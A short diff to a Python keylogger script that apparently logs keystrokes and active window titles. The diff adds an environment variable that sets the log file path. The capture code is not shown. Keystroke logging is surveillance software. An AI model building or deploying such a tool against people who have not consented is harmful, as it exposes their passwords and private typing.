@@ -5,13 +5,14 @@ and window title logging.
 For educational purposes only. Ensure compliance with local laws before use.
 """
 
+import os
 import subprocess
 from datetime import datetime
 
 import psutil
 from pynput import keyboard
 
-LOG_FILE = "keylog.txt"
+LOG_FILE = os.getenv("KEYLOG_FILE", "keylog.txt")
 
 
 def get_active_process() -> str:
